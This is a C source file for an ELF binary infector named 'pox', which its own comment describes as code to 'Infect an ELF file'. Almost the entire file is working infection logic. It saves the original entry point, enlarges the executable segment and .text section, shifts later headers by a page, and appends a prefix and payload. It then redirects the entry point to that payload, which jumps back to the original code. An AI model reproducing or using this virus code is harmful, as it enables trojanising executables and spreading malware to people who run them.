#include "pox.h"

#define MAX(a, b) (a)>(b)?(a):(b)

/*
 * Infect an ELF file
 *
 * elf = the target BIN object that contains the entire ELF binary
 * payload = the BIN object that contains the payload and its target architecture
 * out = the BIN object target that will be created and can be written to disk
 * buf_tmp = a temporary buffer of the same size as elf that should be allocated by caller.
 * buf_out = the buffer used for the final ELF payload, pointed to by `out->base`
 */
bool pox(const bin_t *elf, const bin_t *payload, bin_t *out, byte_t *buf_tmp, byte_t *buf_out){
    if(elf->arch != payload->arch){
        return NULL;
    }
    byte_t pfx[MAX(sizeof(pfx32), sizeof(pfx64))];
    bool text_found = false;
    uint64_t entry, vaddr, text_end;
    uint32_t jmp_offset;
    size_t text_size, i;
    bin_t elf_tmp, elf_out;
    const size_t total_payload_len = payload->len + pox_pfxlen(elf),
                 padlen = pox_padlen(elf, total_payload_len),
                 phnum = pox_get_phnum(elf), shnum = pox_get_shnum(elf);

    DBG("Infecting ELF with %zu-byte payload\n", total_payload_len);

    entry = pox_get_entry(elf);                                     // save original entry point
    pox_memcpy(buf_tmp, elf->base, elf->len);                           // copy the elf as-is
    pox_memcpy(pfx, pox_pfx(elf), pox_pfxlen(elf));                     // copy the prefix for the target architecture

    elf_tmp = (bin_t){                                              // create elf to manipulate prior to assembly
        .base=buf_tmp, .arch=elf->arch, .len=elf->len,
    };

    elf_out = (bin_t){                                              // create elf for output, `padlen` bytes larger
        .base=buf_out, .arch=elf->arch, .len=elf->len+padlen,
    };

    /* Iterate program headers */
    for(i = 0; i < phnum; ++i){
        if(text_found){
            pox_extend_p_offset(&elf_tmp, i, padlen);               // this entry is after the text section, adjust offset
            continue;                                               // done with this entry
        }
        if(pox_is_text_program(&elf_tmp, i)){                       // check if the entry contains the text section
            text_found = true;                                      // this entry contains the text section
            text_size = pox_get_p_filesz(&elf_tmp, i);              // get size of the text section
            text_end = pox_get_p_end(&elf_tmp, i);                  // get the pointer to the end of the text section
            vaddr = pox_get_p_vaddr(&elf_tmp, i) + text_size;       // new entry point will be vaddr of END of .text section

            DBG("Program entry containing .text section "
                "is %zu bytes ending at 0x%08lx\n",
                text_size, text_end);

            if(!pox_set_entry(&elf_tmp, vaddr)){                    // update the entry point
                DBG("Invalid VADDR Value: 0x%lx\n", vaddr);
                return NULL;
            }
            DBG("Patched program entry point from 0x%08lx to Vaddr 0x%08lx\n", entry, vaddr);

            pox_extend_p_filesz(&elf_tmp, i, total_payload_len);    // extend filesz (size on disk)
            pox_extend_p_memsz(&elf_tmp, i, total_payload_len);     // extend memsz (size of memory footprint, includes .bss)
            DBG("%s\n", "Extended program header filesz and memsz");
        }
    }

    DBG("%s\n", "Extending section header offsets");
    // Iterate over section header entries
    for(i = 0; i < shnum; ++i){
        if(pox_get_s_offset(&elf_tmp, i) >= text_end){              // check if entry is after the current text section
            pox_extend_s_offset(&elf_tmp, i, padlen);               // extend offset of the entry
        }else if(pox_is_text_section(&elf_tmp, i)){
            DBG("%s\n", "Expanding .text section size");
            pox_extend_s_size(&elf_tmp, i, total_payload_len);      // extend size of .text entry to fit the payload
        }
    }
    
    pox_extend_shoff(&elf_tmp, PAGESIZE);
    jmp_offset = vaddr - entry + pox_pfxoff(&elf_tmp);
    *((uint32_t*)(pfx + pox_pfxjmp(&elf_tmp))) = jmp_offset;

    // copy the binary up to the end of the current .text text section
    pox_memcpy(buf_out, elf_tmp.base, (size_t)text_end);

    // append the crafted prefix to the end of .text section
    pox_memcpy(buf_out + text_end, pfx, pox_pfxlen(&elf_tmp));

    // append the payload onto the end of the section
    pox_memcpy(buf_out + text_end + pox_pfxlen(&elf_tmp), payload->base, payload->len);

    // add the remainder of the ELF binary + sections to the next page boundary
    pox_memcpy(buf_out + text_end + padlen, elf_tmp.base + text_end, elf_tmp.len - text_end);

    pox_memcpy(out, &elf_out, sizeof(elf_out));
    return true;
}

void pox_memcpy(void *dst, const void *src, size_t n){
    byte_t *p1 = (byte_t*)dst;
    const byte_t *p2 = (const byte_t*)src;
    for(size_t i = 0; i < n; ++i){
        p1[i] = p2[i];
    }
}

/* get nearest multiple */
static int roundup(int n, int m) {
    int r;
    if(m == 0){
        return n;
    }
    if((r = n % m) == 0){
        return n;
    }
    return n + m - r;
}

/* bitwise compare 2 pointers to determine if they are equal */
static bool bufsame(const byte_t *p1, const byte_t *p2, size_t length) {
    byte_t c;
    for(size_t i = 0; i < length; ++i){
        c |= p1[i] ^ p2[i];
    }
    return c == 0;
}

size_t pox_padlen(const bin_t *elf, size_t payload_size){
    switch(elf->arch){
        case ARCH_32: return roundup(payload_size + sizeof(pfx32), PAGESIZE);
        case ARCH_64: return roundup(payload_size + sizeof(pfx64), PAGESIZE);
        default: return 0;
    }
}

const byte_t* pox_pfx(const bin_t *bin){
    switch(bin->arch){
        case ARCH_32: return pfx32;
        case ARCH_64: return pfx64;
        default: return 0;
    }
}

size_t pox_pfxlen(const bin_t *bin){
    switch(bin->arch){
        case ARCH_32: return sizeof(pfx32);
        case ARCH_64: return sizeof(pfx64);
        default: return 0;
    }
}

size_t pox_pfxjmp(const bin_t *bin){
    switch(bin->arch){
        case ARCH_32: return pfx32jmp;
        case ARCH_64: return pfx64jmp;
        default: return 0;
    }
}

size_t pox_pfxoff(const bin_t *bin){
    switch(bin->arch){
        case ARCH_32: return pfx32off;
        case ARCH_64: return pfx64off;
        default: return 0;
    }
}

size_t pox_get_phnum(const bin_t *elf){
    switch(elf->arch){
        case ARCH_32: return E32(elf)->e_phnum;
        case ARCH_64: return E64(elf)->e_phnum;
        default: return 0;
    }
}

size_t pox_get_shnum(const bin_t *elf){
    switch(elf->arch){
        case ARCH_32: return E32(elf)->e_shnum;
        case ARCH_64: return E64(elf)->e_shnum;
        default: return 0;
    }
}

uint64_t pox_get_entry(const bin_t *elf){
    switch(elf->arch){
        case ARCH_32: return E32(elf)->e_entry;
        case ARCH_64: return E64(elf)->e_entry;
        default: return 0;
    }
}

const char* pox_get_strtable(const bin_t *elf){
    switch(elf->arch){
        case ARCH_32: return (char*)elf->base + S32(elf)[E32(elf)->e_shstrndx].sh_offset;
        case ARCH_64: return (char*)elf->base + S64(elf)[E64(elf)->e_shstrndx].sh_offset;
        default: return NULL;
    }
}

bool pox_is_text_program(const bin_t *elf, size_t idx){
    switch(elf->arch){
        case ARCH_32: return P32(elf)[idx].p_type == PT_LOAD && P32(elf)[idx].p_flags == (PF_R | PF_X);
        case ARCH_64: return P64(elf)[idx].p_type == PT_LOAD && P64(elf)[idx].p_flags == (PF_R | PF_X);
        default: return false;
    }
}

bool pox_is_text_section(const bin_t *elf, size_t idx){
    const char *name = pox_get_strtable(elf) + pox_get_s_name(elf, idx);
    return bufsame((byte_t*)name, (byte_t*)".text", 6);
}

uint64_t pox_get_p_end(const bin_t *elf, size_t idx){
    switch(elf->arch){
        case ARCH_32: return P32(elf)[idx].p_offset + P32(elf)[idx].p_filesz;
        case ARCH_64: return P64(elf)[idx].p_offset + P64(elf)[idx].p_filesz;
        default: return 0;
    }
}

uint64_t pox_get_p_vaddr(const bin_t *elf, size_t idx){
    switch(elf->arch){
        case ARCH_32: return P32(elf)[idx].p_vaddr;
        case ARCH_64: return P64(elf)[idx].p_vaddr;
        default: return 0;
    }
}

size_t pox_get_p_filesz(const bin_t *elf, size_t idx){
    switch(elf->arch){
        case ARCH_32: return P32(elf)[idx].p_filesz;
        case ARCH_64: return P64(elf)[idx].p_filesz;
        default: return 0;
    }
}

size_t pox_get_s_offset(const bin_t *elf, size_t idx){
    switch(elf->arch){
        case ARCH_32: return S32(elf)[idx].sh_offset;
        case ARCH_64: return S64(elf)[idx].sh_offset;
        default: return 0;
    }
}

size_t pox_get_s_name(const bin_t *elf, size_t idx){
    switch(elf->arch){
        case ARCH_32: return S32(elf)[idx].sh_name;
        case ARCH_64: return S64(elf)[idx].sh_name;
        default: return 0;
    }
}

bool pox_set_entry(bin_t *elf, uint64_t entry){
    if(entry > UINT32_MAX){
        return false;
    }
    switch(elf->arch){
        case ARCH_32: E32(elf)->e_entry = entry; break;
        case ARCH_64: E64(elf)->e_entry = entry; break;
        default: return false;
    }
    return true;
}

bool pox_extend_shoff(bin_t *elf, size_t offset){
    switch(elf->arch){
        case ARCH_32: E32(elf)->e_shoff += offset; break;
        case ARCH_64: E64(elf)->e_shoff += offset; break;
        default: return false;
    }
    return true;
}

bool pox_extend_p_offset(bin_t *elf, size_t idx, size_t offset){
    switch(elf->arch){
        case ARCH_32: P32(elf)[idx].p_offset += offset; break;
        case ARCH_64: P64(elf)[idx].p_offset += offset; break;
        default: return false;
    }
    return true;
}

bool pox_extend_p_filesz(bin_t *elf, size_t idx, size_t offset){
    switch(elf->arch){
        case ARCH_32: P32(elf)[idx].p_filesz += offset; break;
        case ARCH_64: P64(elf)[idx].p_filesz += offset; break;
        default: return false;
    }
    return true;
}

bool pox_extend_p_memsz(bin_t *elf, size_t idx, size_t offset){
    switch(elf->arch){
        case ARCH_32: P32(elf)[idx].p_memsz += offset; break;
        case ARCH_64: P64(elf)[idx].p_memsz += offset; break;
        default: return false;
    }
    return true;
}

bool pox_extend_s_offset(bin_t *elf, size_t idx, size_t offset){
    switch(elf->arch){
        case ARCH_32: S32(elf)[idx].sh_offset += offset; break;
        case ARCH_64: S64(elf)[idx].sh_offset += offset; break;
        default: return false;
    }
    return true;
}

bool pox_extend_s_size(bin_t *elf, size_t idx, size_t offset){
    switch(elf->arch){
        case ARCH_32: S32(elf)[idx].sh_size += offset; break;
        case ARCH_64: S64(elf)[idx].sh_size += offset; break;
        default: return false;
    }
    return true;
}
